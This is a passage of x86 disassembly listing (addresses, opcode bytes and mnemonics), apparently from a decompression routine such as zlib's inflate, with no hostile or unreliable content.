  405d63:	77 2a                	ja     0x405d8f
  405d65:	85 ff                	test   %edi,%edi
  405d67:	0f 84 e3 03 00 00    	je     0x406150
  405d6d:	89 d9                	mov    %ebx,%ecx
  405d6f:	eb 08                	jmp    0x405d79
  405d71:	85 ff                	test   %edi,%edi
  405d73:	0f 84 a7 12 00 00    	je     0x407020
  405d79:	83 c5 01             	add    $0x1,%ebp
  405d7c:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  405d80:	83 ef 01             	sub    $0x1,%edi
  405d83:	d3 e0                	shl    %cl,%eax
  405d85:	83 c1 08             	add    $0x8,%ecx
  405d88:	01 c6                	add    %eax,%esi
  405d8a:	83 f9 1f             	cmp    $0x1f,%ecx
  405d8d:	76 e2                	jbe    0x405d71
  405d8f:	89 f2                	mov    %esi,%edx
  405d91:	89 f0                	mov    %esi,%eax
  405d93:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  405d97:	c1 e8 18             	shr    $0x18,%eax
  405d9a:	c1 e2 18             	shl    $0x18,%edx
  405d9d:	01 c2                	add    %eax,%edx
  405d9f:	89 f0                	mov    %esi,%eax
  405da1:	c1 e8 08             	shr    $0x8,%eax
  405da4:	25 00 ff 00 00       	and    $0xff00,%eax
  405da9:	01 c2                	add    %eax,%edx
  405dab:	89 f0                	mov    %esi,%eax
  405dad:	8b b4 24 90 00 00 00 	mov    0x90(%esp),%esi
  405db4:	25 00 ff 00 00       	and    $0xff00,%eax
  405db9:	c1 e0 08             	shl    $0x8,%eax
  405dbc:	01 d0                	add    %edx,%eax
  405dbe:	89 43 18             	mov    %eax,0x18(%ebx)
  405dc1:	89 46 30             	mov    %eax,0x30(%esi)
  405dc4:	31 f6                	xor    %esi,%esi
  405dc6:	c7 03 0a 00 00 00    	movl   $0xa,(%ebx)
  405dcc:	31 db                	xor    %ebx,%ebx
  405dce:	8b 44 24 24          	mov    0x24(%esp),%eax
  405dd2:	8b 48 0c             	mov    0xc(%eax),%ecx
  405dd5:	85 c9                	test   %ecx,%ecx
  405dd7:	0f 84 d6 1a 00 00    	je     0x4078b3
  405ddd:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405de4:	00 
  405de5:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405dec:	00 
  405ded:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405df4:	e8 c7 23 00 00       	call   0x4081c0
  405df9:	8b 54 24 24          	mov    0x24(%esp),%edx
  405dfd:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  405e04:	89 42 18             	mov    %eax,0x18(%edx)
  405e07:	89 41 30             	mov    %eax,0x30(%ecx)
  405e0a:	c7 02 0b 00 00 00    	movl   $0xb,(%edx)
  405e10:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  405e17:	83 e8 05             	sub    $0x5,%eax
  405e1a:	83 f8 01             	cmp    $0x1,%eax
  405e1d:	0f 86 2d 03 00 00    	jbe    0x406150
  405e23:	8b 44 24 24          	mov    0x24(%esp),%eax
  405e27:	8b 50 04             	mov    0x4(%eax),%edx
  405e2a:	85 d2                	test   %edx,%edx
  405e2c:	0f 85 7e 00 00 00    	jne    0x405eb0
  405e32:	83 fb 02             	cmp    $0x2,%ebx
  405e35:	77 1b                	ja     0x405e52
  405e37:	85 ff                	test   %edi,%edi
  405e39:	0f 84 64 17 00 00    	je     0x4075a3
  405e3f:	83 c5 01             	add    $0x1,%ebp
  405e42:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  405e46:	89 d9                	mov    %ebx,%ecx
  405e48:	83 ef 01             	sub    $0x1,%edi
  405e4b:	83 c3 08             	add    $0x8,%ebx
  405e4e:	d3 e0                	shl    %cl,%eax
  405e50:	01 c6                	add    %eax,%esi
  405e52:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  405e56:	89 f0                	mov    %esi,%eax
  405e58:	89 f2                	mov    %esi,%edx
  405e5a:	83 e0 01             	and    $0x1,%eax
  405e5d:	d1 ea                	shr    $1,%edx
  405e5f:	89 41 04             	mov    %eax,0x4(%ecx)
  405e62:	89 d0                	mov    %edx,%eax
  405e64:	83 e0 03             	and    $0x3,%eax
  405e67:	83 f8 02             	cmp    $0x2,%eax
  405e6a:	0f 84 d2 14 00 00    	je     0x407342
  405e70:	83 f8 03             	cmp    $0x3,%eax
  405e73:	0f 84 e1 16 00 00    	je     0x40755a
  405e79:	83 f8 01             	cmp    $0x1,%eax
  405e7c:	0f 84 9a 16 00 00    	je     0x40751c
  405e82:	c7 01 0d 00 00 00    	movl   $0xd,(%ecx)
  405e88:	b8 0d 00 00 00       	mov    $0xd,%eax
  405e8d:	89 d6                	mov    %edx,%esi
  405e8f:	83 eb 03             	sub    $0x3,%ebx
  405e92:	c1 ee 02             	shr    $0x2,%esi
  405e95:	e9 b6 fe ff ff       	jmp    0x405d50
  405e9a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405ea0:	c7 07 0c 00 00 00    	movl   $0xc,(%edi)
  405ea6:	b0 0c                	mov    $0xc,%al
  405ea8:	e9 5d fe ff ff       	jmp    0x405d0a
  405ead:	8d 76 00             	lea    0x0(%esi),%esi
  405eb0:	8b 44 24 24          	mov    0x24(%esp),%eax
  405eb4:	89 d9                	mov    %ebx,%ecx
  405eb6:	83 e3 f8             	and    $0xfffffff8,%ebx
  405eb9:	83 e1 07             	and    $0x7,%ecx
  405ebc:	d3 ee                	shr    %cl,%esi
  405ebe:	c7 00 1a 00 00 00    	movl   $0x1a,(%eax)
  405ec4:	b8 1a 00 00 00       	mov    $0x1a,%eax
  405ec9:	e9 8b fe ff ff       	jmp    0x405d59
  405ece:	66 90                	xchg   %ax,%ax
  405ed0:	8b 44 24 24          	mov    0x24(%esp),%eax
  405ed4:	8b 50 48             	mov    0x48(%eax),%edx
  405ed7:	85 d2                	test   %edx,%edx
  405ed9:	74 59                	je     0x405f34
  405edb:	39 d3                	cmp    %edx,%ebx
  405edd:	73 30                	jae    0x405f0f
  405edf:	85 ff                	test   %edi,%edi
  405ee1:	0f 84 69 02 00 00    	je     0x406150
  405ee7:	89 d9                	mov    %ebx,%ecx
  405ee9:	eb 0d                	jmp    0x405ef8
  405eeb:	90                   	nop
  405eec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405ef0:	85 ff                	test   %edi,%edi
  405ef2:	0f 84 28 11 00 00    	je     0x407020
  405ef8:	83 c5 01             	add    $0x1,%ebp
  405efb:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  405eff:	83 ef 01             	sub    $0x1,%edi
  405f02:	d3 e0                	shl    %cl,%eax
  405f04:	83 c1 08             	add    $0x8,%ecx
  405f07:	01 c6                	add    %eax,%esi
  405f09:	39 d1                	cmp    %edx,%ecx
  405f0b:	72 e3                	jb     0x405ef0
  405f0d:	89 cb                	mov    %ecx,%ebx
  405f0f:	89 d1                	mov    %edx,%ecx
  405f11:	b8 01 00 00 00       	mov    $0x1,%eax
  405f16:	29 d3                	sub    %edx,%ebx
  405f18:	d3 e0                	shl    %cl,%eax
  405f1a:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  405f1e:	83 e8 01             	sub    $0x1,%eax
  405f21:	21 f0                	and    %esi,%eax
  405f23:	01 41 44             	add    %eax,0x44(%ecx)
  405f26:	89 d1                	mov    %edx,%ecx
  405f28:	d3 ee                	shr    %cl,%esi
  405f2a:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  405f2e:	01 91 c4 1b 00 00    	add    %edx,0x1bc4(%ecx)
  405f34:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f38:	c7 00 18 00 00 00    	movl   $0x18,(%eax)
  405f3e:	8b 54 24 28          	mov    0x28(%esp),%edx
  405f42:	85 d2                	test   %edx,%edx
  405f44:	0f 84 06 02 00 00    	je     0x406150
  405f4a:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  405f4e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405f52:	8b 49 44             	mov    0x44(%ecx),%ecx
  405f55:	29 d0                	sub    %edx,%eax
  405f57:	39 c8                	cmp    %ecx,%eax
  405f59:	0f 83 a5 11 00 00    	jae    0x407104
  405f5f:	29 c1                	sub    %eax,%ecx
  405f61:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f65:	3b 48 2c             	cmp    0x2c(%eax),%ecx
  405f68:	0f 87 36 13 00 00    	ja     0x4072a4
  405f6e:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f72:	8b 40 30             	mov    0x30(%eax),%eax
  405f75:	39 c1                	cmp    %eax,%ecx
  405f77:	0f 86 c3 14 00 00    	jbe    0x407440
  405f7d:	8b 54 24 24          	mov    0x24(%esp),%edx
  405f81:	29 c1                	sub    %eax,%ecx
  405f83:	8b 42 28             	mov    0x28(%edx),%eax
  405f86:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  405f8a:	29 c8                	sub    %ecx,%eax
  405f8c:	03 42 34             	add    0x34(%edx),%eax
  405f8f:	89 44 24 40          	mov    %eax,0x40(%esp)
  405f93:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f97:	8b 50 40             	mov    0x40(%eax),%edx
  405f9a:	39 d1                	cmp    %edx,%ecx
  405f9c:	0f 47 ca             	cmova  %edx,%ecx
  405f9f:	e9 73 11 00 00       	jmp    0x407117
  405fa4:	83 bc 24 94 00 00 00 	cmpl   $0x6,0x94(%esp)
  405fab:	06 
  405fac:	8b 44 24 24          	mov    0x24(%esp),%eax
  405fb0:	c7 00 13 00 00 00    	movl   $0x13,(%eax)
  405fb6:	0f 84 94 01 00 00    	je     0x406150
  405fbc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405fc0:	8b 44 24 24          	mov    0x24(%esp),%eax
  405fc4:	c7 00 14 00 00 00    	movl   $0x14,(%eax)
  405fca:	83 ff 05             	cmp    $0x5,%edi
  405fcd:	76 0e                	jbe    0x405fdd
  405fcf:	81 7c 24 28 01 01 00 	cmpl   $0x101,0x28(%esp)
  405fd6:	00 
  405fd7:	0f 87 a7 11 00 00    	ja     0x407184
  405fdd:	8b 44 24 24          	mov    0x24(%esp),%eax
  405fe1:	8b 48 4c             	mov    0x4c(%eax),%ecx
  405fe4:	c7 80 c4 1b 00 00 00 	movl   $0x0,0x1bc4(%eax)
  405feb:	00 00 00 
  405fee:	89 ca                	mov    %ecx,%edx
  405ff0:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  405ff4:	8b 48 54             	mov    0x54(%eax),%ecx
  405ff7:	b8 01 00 00 00       	mov    $0x1,%eax
  405ffc:	d3 e0                	shl    %cl,%eax
  405ffe:	83 e8 01             	sub    $0x1,%eax
  406001:	89 44 24 48          	mov    %eax,0x48(%esp)
  406005:	21 f0                	and    %esi,%eax
  406007:	8d 04 82             	lea    (%edx,%eax,4),%eax
  40600a:	0f b6 10             	movzbl (%eax),%edx
  40600d:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  406011:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  406015:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406019:	66 89 44 24 54       	mov    %ax,0x54(%esp)
  40601e:	0f b6 c2             	movzbl %dl,%eax
  406021:	39 c3                	cmp    %eax,%ebx
  406023:	89 44 24 44          	mov    %eax,0x44(%esp)
  406027:	73 62                	jae    0x40608b
  406029:	85 ff                	test   %edi,%edi
  40602b:	0f 84 1f 01 00 00    	je     0x406150
  406031:	89 d9                	mov    %ebx,%ecx
  406033:	89 f3                	mov    %esi,%ebx
  406035:	89 fe                	mov    %edi,%esi
  406037:	eb 0f                	jmp    0x406048
  406039:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406040:	85 f6                	test   %esi,%esi
  406042:	0f 84 2b 13 00 00    	je     0x407373
  406048:	83 c5 01             	add    $0x1,%ebp
  40604b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  40604f:	8b 54 24 40          	mov    0x40(%esp),%edx
  406053:	83 ee 01             	sub    $0x1,%esi
  406056:	d3 e0                	shl    %cl,%eax
  406058:	83 c1 08             	add    $0x8,%ecx
  40605b:	01 c3                	add    %eax,%ebx
  40605d:	8b 44 24 48          	mov    0x48(%esp),%eax
  406061:	21 d8                	and    %ebx,%eax
  406063:	8d 04 82             	lea    (%edx,%eax,4),%eax
  406066:	0f b6 10             	movzbl (%eax),%edx
  406069:	0f b7 78 02          	movzwl 0x2(%eax),%edi
  40606d:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  406071:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  406075:	0f b6 c2             	movzbl %dl,%eax
  406078:	39 c8                	cmp    %ecx,%eax
  40607a:	89 44 24 44          	mov    %eax,0x44(%esp)
  40607e:	77 c0                	ja     0x406040
  406080:	66 89 7c 24 54       	mov    %di,0x54(%esp)
  406085:	89 f7                	mov    %esi,%edi
  406087:	89 de                	mov    %ebx,%esi
  406089:	89 cb                	mov    %ecx,%ebx
  40608b:	80 7c 24 3c 00       	cmpb   $0x0,0x3c(%esp)
  406090:	0f 84 2a 13 00 00    	je     0x4073c0
  406096:	f6 44 24 3c f0       	testb  $0xf0,0x3c(%esp)
  40609b:	0f 85 1f 13 00 00    	jne    0x4073c0
  4060a1:	0f b7 4c 24 54       	movzwl 0x54(%esp),%ecx
  4060a6:	89 44 24 48          	mov    %eax,0x48(%esp)
  4060aa:	b8 01 00 00 00       	mov    $0x1,%eax
  4060af:	89 4c 24 58          	mov    %ecx,0x58(%esp)
  4060b3:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  4060b8:	02 4c 24 48          	add    0x48(%esp),%cl
  4060bc:	d3 e0                	shl    %cl,%eax
  4060be:	89 d1                	mov    %edx,%ecx
  4060c0:	8b 54 24 40          	mov    0x40(%esp),%edx
  4060c4:	83 e8 01             	sub    $0x1,%eax
  4060c7:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  4060cb:	21 f0                	and    %esi,%eax
  4060cd:	d3 e8                	shr    %cl,%eax
  4060cf:	03 44 24 58          	add    0x58(%esp),%eax
  4060d3:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  4060d7:	8d 04 82             	lea    (%edx,%eax,4),%eax
  4060da:	0f b6 10             	movzbl (%eax),%edx
  4060dd:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  4060e1:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  4060e5:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  4060e9:	66 89 54 24 54       	mov    %dx,0x54(%esp)
  4060ee:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  4060f1:	39 d3                	cmp    %edx,%ebx
  4060f3:	72 53                	jb     0x406148
  4060f5:	e9 35 16 00 00       	jmp    0x40772f
  4060fa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406100:	83 c5 01             	add    $0x1,%ebp
  406103:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406107:	89 d9                	mov    %ebx,%ecx
  406109:	83 c3 08             	add    $0x8,%ebx
  40610c:	83 ef 01             	sub    $0x1,%edi
  40610f:	d3 e0                	shl    %cl,%eax
  406111:	0f b6 4c 24 48       	movzbl 0x48(%esp),%ecx
  406116:	01 c6                	add    %eax,%esi
  406118:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  40611c:	21 f0                	and    %esi,%eax
  40611e:	d3 e8                	shr    %cl,%eax
  406120:	03 44 24 58          	add    0x58(%esp),%eax
  406124:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  406128:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  40612b:	0f b6 10             	movzbl (%eax),%edx
  40612e:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  406132:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  406136:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  40613a:	8b 54 24 48          	mov    0x48(%esp),%edx
  40613e:	01 c2                	add    %eax,%edx
  406140:	39 da                	cmp    %ebx,%edx
  406142:	0f 86 e2 15 00 00    	jbe    0x40772a
  406148:	85 ff                	test   %edi,%edi
  40614a:	75 b4                	jne    0x406100
  40614c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406150:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  406154:	89 de                	mov    %ebx,%esi
  406156:	89 eb                	mov    %ebp,%ebx
  406158:	89 fd                	mov    %edi,%ebp
  40615a:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40615e:	e9 3d 02 00 00       	jmp    0x4063a0
  406163:	8b 44 24 24          	mov    0x24(%esp),%eax
  406167:	8b 50 48             	mov    0x48(%eax),%edx
  40616a:	85 d2                	test   %edx,%edx
  40616c:	0f 85 9e 10 00 00    	jne    0x407210
  406172:	8b 44 24 24          	mov    0x24(%esp),%eax
  406176:	8b 40 40             	mov    0x40(%eax),%eax
  406179:	8b 54 24 24          	mov    0x24(%esp),%edx
  40617d:	89 82 c8 1b 00 00    	mov    %eax,0x1bc8(%edx)
  406183:	c7 02 16 00 00 00    	movl   $0x16,(%edx)
  406189:	8b 44 24 24          	mov    0x24(%esp),%eax
  40618d:	8b 48 58             	mov    0x58(%eax),%ecx
  406190:	8b 50 50             	mov    0x50(%eax),%edx
  406193:	b8 01 00 00 00       	mov    $0x1,%eax
  406198:	d3 e0                	shl    %cl,%eax
  40619a:	89 54 24 40          	mov    %edx,0x40(%esp)
  40619e:	83 e8 01             	sub    $0x1,%eax
  4061a1:	89 44 24 48          	mov    %eax,0x48(%esp)
  4061a5:	21 f0                	and    %esi,%eax
  4061a7:	8d 04 82             	lea    (%edx,%eax,4),%eax
  4061aa:	0f b6 10             	movzbl (%eax),%edx
  4061ad:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  4061b1:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  4061b5:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4061b9:	66 89 44 24 54       	mov    %ax,0x54(%esp)
  4061be:	0f b6 c2             	movzbl %dl,%eax
  4061c1:	39 c3                	cmp    %eax,%ebx
  4061c3:	89 44 24 44          	mov    %eax,0x44(%esp)
  4061c7:	73 57                	jae    0x406220
  4061c9:	85 ff                	test   %edi,%edi
  4061cb:	74 83                	je     0x406150
  4061cd:	89 d9                	mov    %ebx,%ecx
  4061cf:	89 fb                	mov    %edi,%ebx
  4061d1:	89 ef                	mov    %ebp,%edi
  4061d3:	eb 08                	jmp    0x4061dd
  4061d5:	85 db                	test   %ebx,%ebx
  4061d7:	0f 84 83 11 00 00    	je     0x407360
  4061dd:	83 c7 01             	add    $0x1,%edi
  4061e0:	0f b6 47 ff          	movzbl -0x1(%edi),%eax
  4061e4:	8b 54 24 40          	mov    0x40(%esp),%edx
  4061e8:	83 eb 01             	sub    $0x1,%ebx
  4061eb:	d3 e0                	shl    %cl,%eax
  4061ed:	83 c1 08             	add    $0x8,%ecx
  4061f0:	01 c6                	add    %eax,%esi
  4061f2:	8b 44 24 48          	mov    0x48(%esp),%eax
  4061f6:	21 f0                	and    %esi,%eax
  4061f8:	8d 04 82             	lea    (%edx,%eax,4),%eax
  4061fb:	0f b6 10             	movzbl (%eax),%edx
  4061fe:	0f b7 68 02          	movzwl 0x2(%eax),%ebp
  406202:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  406206:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  40620a:	0f b6 c2             	movzbl %dl,%eax
  40620d:	39 c8                	cmp    %ecx,%eax
  40620f:	89 44 24 44          	mov    %eax,0x44(%esp)
  406213:	77 c0                	ja     0x4061d5
  406215:	66 89 6c 24 54       	mov    %bp,0x54(%esp)
  40621a:	89 fd                	mov    %edi,%ebp
  40621c:	89 df                	mov    %ebx,%edi
  40621e:	89 cb                	mov    %ecx,%ebx
  406220:	f6 44 24 3c f0       	testb  $0xf0,0x3c(%esp)
  406225:	0f 85 a9 10 00 00    	jne    0x4072d4
  40622b:	0f b7 4c 24 54       	movzwl 0x54(%esp),%ecx
  406230:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  406234:	b8 01 00 00 00       	mov    $0x1,%eax
  406239:	89 4c 24 48          	mov    %ecx,0x48(%esp)
  40623d:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  406242:	02 4c 24 5c          	add    0x5c(%esp),%cl
  406246:	d3 e0                	shl    %cl,%eax
  406248:	89 d1                	mov    %edx,%ecx
  40624a:	8b 54 24 40          	mov    0x40(%esp),%edx
  40624e:	83 e8 01             	sub    $0x1,%eax
  406251:	89 44 24 58          	mov    %eax,0x58(%esp)
  406255:	21 f0                	and    %esi,%eax
  406257:	d3 e8                	shr    %cl,%eax
  406259:	03 44 24 48          	add    0x48(%esp),%eax
  40625d:	8b 4c 24 5c          	mov    0x5c(%esp),%ecx
  406261:	8d 04 82             	lea    (%edx,%eax,4),%eax
  406264:	0f b6 10             	movzbl (%eax),%edx
  406267:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  40626b:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  40626f:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  406273:	66 89 54 24 54       	mov    %dx,0x54(%esp)
  406278:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  40627b:	39 d3                	cmp    %edx,%ebx
  40627d:	73 65                	jae    0x4062e4
  40627f:	85 ff                	test   %edi,%edi
  406281:	0f 84 c9 fe ff ff    	je     0x406150
  406287:	89 f0                	mov    %esi,%eax
  406289:	8b 54 24 5c          	mov    0x5c(%esp),%edx
  40628d:	89 fe                	mov    %edi,%esi
  40628f:	89 c7                	mov    %eax,%edi
  406291:	eb 08                	jmp    0x40629b
  406293:	85 f6                	test   %esi,%esi
  406295:	0f 84 4a 12 00 00    	je     0x4074e5
  40629b:	83 c5 01             	add    $0x1,%ebp
  40629e:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  4062a2:	89 d9                	mov    %ebx,%ecx
  4062a4:	83 c3 08             	add    $0x8,%ebx
  4062a7:	83 ee 01             	sub    $0x1,%esi
  4062aa:	d3 e0                	shl    %cl,%eax
  4062ac:	89 d1                	mov    %edx,%ecx
  4062ae:	01 c7                	add    %eax,%edi
  4062b0:	8b 44 24 58          	mov    0x58(%esp),%eax
  4062b4:	21 f8                	and    %edi,%eax
  4062b6:	d3 e8                	shr    %cl,%eax
  4062b8:	03 44 24 48          	add    0x48(%esp),%eax
  4062bc:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  4062c0:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4062c3:	0f b6 08             	movzbl (%eax),%ecx
  4062c6:	88 4c 24 3c          	mov    %cl,0x3c(%esp)
  4062ca:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  4062ce:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  4062d2:	66 89 4c 24 54       	mov    %cx,0x54(%esp)
  4062d7:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  4062da:	39 d9                	cmp    %ebx,%ecx
  4062dc:	77 b5                	ja     0x406293
  4062de:	89 fa                	mov    %edi,%edx
  4062e0:	89 f7                	mov    %esi,%edi
  4062e2:	89 d6                	mov    %edx,%esi
  4062e4:	8b 54 24 5c          	mov    0x5c(%esp),%edx
  4062e8:	2b 5c 24 44          	sub    0x44(%esp),%ebx
  4062ec:	89 d1                	mov    %edx,%ecx
  4062ee:	d3 ee                	shr    %cl,%esi
  4062f0:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4062f4:	03 91 c4 1b 00 00    	add    0x1bc4(%ecx),%edx
  4062fa:	e9 df 0f 00 00       	jmp    0x4072de
  4062ff:	90                   	nop
  406300:	8b 44 24 24          	mov    0x24(%esp),%eax
  406304:	8b 50 10             	mov    0x10(%eax),%edx
  406307:	f6 c6 04             	test   $0x4,%dh
  40630a:	0f 84 30 08 00 00    	je     0x406b40
  406310:	83 fb 0f             	cmp    $0xf,%ebx
  406313:	77 2a                	ja     0x40633f
  406315:	85 ff                	test   %edi,%edi
  406317:	0f 84 33 fe ff ff    	je     0x406150
  40631d:	89 d9                	mov    %ebx,%ecx
  40631f:	eb 08                	jmp    0x406329
  406321:	85 ff                	test   %edi,%edi
  406323:	0f 84 f7 0c 00 00    	je     0x407020
  406329:	83 c5 01             	add    $0x1,%ebp
  40632c:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406330:	83 ef 01             	sub    $0x1,%edi
  406333:	d3 e0                	shl    %cl,%eax
  406335:	83 c1 08             	add    $0x8,%ecx
  406338:	01 c6                	add    %eax,%esi
  40633a:	83 f9 0f             	cmp    $0xf,%ecx
  40633d:	76 e2                	jbe    0x406321
  40633f:	8b 44 24 24          	mov    0x24(%esp),%eax
  406343:	89 70 40             	mov    %esi,0x40(%eax)
  406346:	8b 40 20             	mov    0x20(%eax),%eax
  406349:	85 c0                	test   %eax,%eax
  40634b:	74 03                	je     0x406350
  40634d:	89 70 14             	mov    %esi,0x14(%eax)
  406350:	f6 c6 02             	test   $0x2,%dh
  406353:	0f 85 22 13 00 00    	jne    0x40767b
  406359:	31 db                	xor    %ebx,%ebx
  40635b:	31 f6                	xor    %esi,%esi
  40635d:	8b 44 24 24          	mov    0x24(%esp),%eax
  406361:	c7 00 05 00 00 00    	movl   $0x5,(%eax)
  406367:	e9 9b 05 00 00       	jmp    0x406907
  40636c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406370:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  406375:	83 c4 7c             	add    $0x7c,%esp
  406378:	5b                   	pop    %ebx
  406379:	5e                   	pop    %esi
  40637a:	5f                   	pop    %edi
  40637b:	5d                   	pop    %ebp
  40637c:	c3                   	ret
  40637d:	8d 76 00             	lea    0x0(%esi),%esi
  406380:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  406384:	89 de                	mov    %ebx,%esi
  406386:	89 eb                	mov    %ebp,%ebx
  406388:	89 fd                	mov    %edi,%ebp
  40638a:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40638e:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  406395:	00 
  406396:	8d 76 00             	lea    0x0(%esi),%esi
  406399:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4063a0:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4063a7:	8b 54 24 30          	mov    0x30(%esp),%edx
  4063ab:	89 50 0c             	mov    %edx,0xc(%eax)
  4063ae:	89 c2                	mov    %eax,%edx
  4063b0:	8b 44 24 28          	mov    0x28(%esp),%eax
  4063b4:	89 1a                	mov    %ebx,(%edx)
  4063b6:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  4063ba:	89 6a 04             	mov    %ebp,0x4(%edx)
  4063bd:	89 42 10             	mov    %eax,0x10(%edx)
  4063c0:	89 77 3c             	mov    %esi,0x3c(%edi)
  4063c3:	89 5f 38             	mov    %ebx,0x38(%edi)
  4063c6:	8b 5f 28             	mov    0x28(%edi),%ebx
  4063c9:	85 db                	test   %ebx,%ebx
  4063cb:	75 23                	jne    0x4063f0
  4063cd:	39 44 24 2c          	cmp    %eax,0x2c(%esp)
  4063d1:	74 3d                	je     0x406410
  4063d3:	8b 07                	mov    (%edi),%eax
  4063d5:	83 f8 1c             	cmp    $0x1c,%eax
  4063d8:	77 36                	ja     0x406410
  4063da:	83 bc 24 94 00 00 00 	cmpl   $0x4,0x94(%esp)
  4063e1:	04 
  4063e2:	75 0c                	jne    0x4063f0
  4063e4:	83 f8 19             	cmp    $0x19,%eax
  4063e7:	77 27                	ja     0x406410
  4063e9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4063f0:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4063f4:	2b 4c 24 28          	sub    0x28(%esp),%ecx
  4063f8:	8b 54 24 30          	mov    0x30(%esp),%edx
  4063fc:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406403:	e8 48 f4 ff ff       	call   0x405850
  406408:	85 c0                	test   %eax,%eax
  40640a:	0f 85 8c 10 00 00    	jne    0x40749c
  406410:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406417:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  40641b:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  40641f:	2b 70 10             	sub    0x10(%eax),%esi
  406422:	2b 58 04             	sub    0x4(%eax),%ebx
  406425:	01 58 08             	add    %ebx,0x8(%eax)
  406428:	01 70 14             	add    %esi,0x14(%eax)
  40642b:	01 77 1c             	add    %esi,0x1c(%edi)
  40642e:	85 f6                	test   %esi,%esi
  406430:	74 3b                	je     0x40646d
  406432:	8b 4f 08             	mov    0x8(%edi),%ecx
  406435:	85 c9                	test   %ecx,%ecx
  406437:	74 34                	je     0x40646d
  406439:	8b 57 10             	mov    0x10(%edi),%edx
  40643c:	89 74 24 08          	mov    %esi,0x8(%esp)
  406440:	85 d2                	test   %edx,%edx
  406442:	0f 84 78 0c 00 00    	je     0x4070c0
  406448:	8b 40 0c             	mov    0xc(%eax),%eax
  40644b:	89 44 24 24          	mov    %eax,0x24(%esp)
  40644f:	29 f0                	sub    %esi,%eax
  406451:	89 44 24 04          	mov    %eax,0x4(%esp)
  406455:	8b 47 18             	mov    0x18(%edi),%eax
  406458:	89 04 24             	mov    %eax,(%esp)
  40645b:	e8 b0 22 00 00       	call   0x408710
  406460:	8b 94 24 90 00 00 00 	mov    0x90(%esp),%edx
  406467:	89 47 18             	mov    %eax,0x18(%edi)
  40646a:	89 42 30             	mov    %eax,0x30(%edx)
  40646d:	83 7f 04 01          	cmpl   $0x1,0x4(%edi)
  406471:	8b 17                	mov    (%edi),%edx
